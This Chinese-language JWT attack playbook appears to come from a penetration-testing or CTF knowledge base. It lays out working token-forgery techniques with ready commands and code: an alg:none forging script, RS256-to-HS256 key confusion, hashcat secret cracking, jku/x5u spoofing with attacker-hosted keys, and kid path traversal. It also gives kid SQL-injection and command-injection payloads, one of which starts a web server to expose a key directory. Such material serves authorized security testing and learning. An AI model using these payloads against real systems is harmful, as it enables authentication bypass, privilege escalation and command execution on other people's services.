---
category: web
tags: [jwt, json web token, token伪造, 令牌攻击, algorithm confusion, 算法混淆, none attack, kid injection, jku, jwks, hmac, rsa, es256, token forgery]
triggers: [jwt, json web token, bearer, authorization, eyJ, alg, HS256, RS256, kid, jku, x5u, x5c, jwks, token, 令牌, 签名验证, signature, claim]
related: [sqli, ssti, command_injection, oauth, race_condition]
---

# JWT 攻击（JSON Web Tokens）

## 什么时候用

- 目标使用 JWT 进行身份认证或会话管理
- HTTP 请求中出现 `Authorization: Bearer eyJ...` 或 Cookie 中含 `eyJ` 开头的 base64 编码串
- 需要伪造/篡改用户身份、提升权限（如普通用户 → admin）

## 前提条件

- 能抓取到有效 JWT（通过代理/浏览器）
- 了解 JWT 三段式结构：`header.payload.signature`（均为 base64url 编码）

## 攻击步骤

### 0. 快速扫描

用 jwt_tool 跑全自动检测，寻找绿色通过项：

```bash
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT>"
```

### 1. 签名验证检查

篡改 payload（如 `username` 改为 `admin`），保持 signature 不变，重放请求：
- 返回变化/报错 → 有验证
- 返回不变 → **未验证签名**，直接修改 claim 即可提权

### 2. alg:none 攻击

将 header 中 `alg` 设为 `"None"`/`"none"`/`"NONE"`/`"nOnE"`，删除 signature 部分（保留末尾的 `.`）：

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user": "admin", "role": "admin"}).encode()).rstrip(b'=')
token = header.decode() + '.' + payload.decode() + '.'
print(token)
```

⚠️ 大小写变体都要试：`None`, `none`, `NONE`, `nOnE`

### 3. RS256→HS256 算法混淆（CVE-2016-5431 / CVE-2016-10555）

原理：服务端用 RS256 时用**公钥**验签。若改 `alg` 为 HS256，服务端可能用**公钥作为 HMAC 密钥**验证，而公钥是可获取的。

```bash
# 获取服务端公钥
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem

# 用 jwt_tool 伪造
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
```

也可用 Burp JWT Editor：导入 RSA 公钥 → Attack → HMAC Key Confusion Attack。

### 4. 弱密钥爆破

适用于 HS256/HS384/HS512，离线爆破 HMAC 密钥：

```bash
# jwt_tool 字典爆破
python3 jwt_tool.py <JWT> -C -d /path/to/wordlist.txt

# hashcat GPU 加速（mode 16500）
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

密钥恢复后即可伪造任意 claim 并重新签名。

### 5. 从泄露配置推导签名密钥

当存在任意文件读取或备份泄露时，可能获取到应用加密密钥和用户表数据：

```python
from hashlib import sha256
from base64 import b64encode
import jwt

jwt_secret = sha256(encryption_key[::2].encode()).hexdigest()
jwt_hash = b64encode(sha256(f"{email}:{password_hash}".encode()).digest()).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```

### 6. JKU/JWKS 欺骗

`jku`（JWK Set URL）指定公钥获取地址。若服务端未限制 jku URL：

```bash
# 生成攻击者密钥对
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key

# 提取 n 和 e 参数，构建 JWKS
python3 -c "
from Crypto.PublicKey import RSA
key = RSA.importKey(open('publickey.crt').read())
print('n:', hex(key.n))
print('e:', hex(key.e))
"
```

步骤：
1. 生成新密钥对
2. 构建 JWKS JSON 并托管到攻击者服务器
3. 修改 JWT header 的 `jku` 指向攻击者 JWKS URL
4. 用攻击者私钥签名 → 服务端从攻击者 URL 获取公钥 → 验证通过

```bash
python3 jwt_tool.py <JWT> -X s
```

### 7. x5u / x5c 注入

**x5u**：指向 X.509 证书链 URL，攻击方式类似 jku。

```bash
# 生成自签名证书
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```

修改 JWT 的 `x5u` 指向攻击者证书 URL，用攻击者私钥签名。

**x5c**：证书直接嵌入 header（base64 编码），生成自签名证书后替换 x5c 值并重新签名。

### 8. kid 注入

`kid`（Key ID）用于指定验证密钥，存在多种注入向量：

#### 路径穿越

```bash
# 指向 /dev/null（空内容 = 空密钥）
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# 指向已知内容文件
# /proc/sys/kernel/randomize_va_space 内容为 "2"
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

也可设 JWK `k` 为 `AA==`（base64 的空字节），配合 `kid` 穿越到 `/dev/null`。

#### SQL 注入

当 kid 值用于数据库查询时：

```
kid: non-existent-index' UNION SELECT 'ATTACKER';-- -
```

然后用 `ATTACKER` 作为 HMAC 密钥签名。

#### 命令注入

当 kid 值被拼入命令行执行时：

```
kid: /root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&
```

### 9. 内嵌公钥攻击（CVE-2018-0114）

JWT header 中嵌入 JWK 公钥，服务端直接用该公钥验证。攻击者生成新密钥对，将公钥嵌入 header，用自己私钥签名：

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

用 Burp JWT Editor 的 CVE-2018-0114 模式自动完成。

### 10. ES256 nonce 重用

若应用使用 ES256 且签名两个 JWT 时使用了相同的 nonce（k 值），可恢复 ECDSA 私钥。

### 11. 其他检查

- **过期检查**：修改/移除 `exp` claim，重放过期 token
- **JTI 重放**：若 JTI 长度有限（如 4 位），可通过 ID 碰撞重放
- **跨服务重放**：同一 JWT 签发服务的不同客户端间尝试 token 重放

## 常见坑

| 坑 | 说明 |
|---|---|
| base64url vs base64 | JWT 使用 base64**url** 编码（`-` `_` 代替 `+` `/`，无 `=` 填充） |
| alg 大小写 | `none` 的各种大小写变体都要尝试 |
| 公钥格式 | 算法混淆需要正确格式的公钥（PEM/DER），换行符敏感 |
| JWKS 缓存 | 服务端可能缓存 JWKS，修改后需等待缓存过期 |
| kid 注入盲区 | kid 可能经过验证/过滤，需测试多种 payload |
| 双 token | 有些应用同时使用 access token + refresh token，两个都要测 |

## 变体

- **JWE（JSON Web Encryption）**：加密而非签名的 JWT，攻击面不同
- **JWS Compact / JWS JSON**：序列化格式差异
- **Paseto**：JWT 的安全替代方案，无算法选择漏洞

## 常用工具

| 工具 | 用途 |
|---|---|
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | 解码、篡改 claim/header、离线爆破（`-C`）、半自动攻击（`-M at`） |
| [Burp JWT Editor](https://github.com/PortSwigger/jwt-editor) | Repeater 中解码/重签，内置 none/HMAC 混淆/JWK 嵌入/jku 注入攻击 |
| [hashcat](https://hashcat.net/hashcat/) | GPU 加速 HS256 密钥爆破（`-m 16500`） |
| [SignSaboteur](https://github.com/d0ge/sign-saboteur) | Burp 扩展，从 Burp 发起 JWT 攻击 |
| [jwt.io](https://jwt.io) | 在线解码/编码/验签 |
| [python-jwt](https://pypi.org/project/PyJWT/) | Python 库，脚本化伪造 token |

## 相关技术

- [[web/sqli]] — kid SQL 注入利用
- [[web/ssti]] — JWT payload 中的模板注入场景
- [[web/command_injection]] — kid 命令注入利用
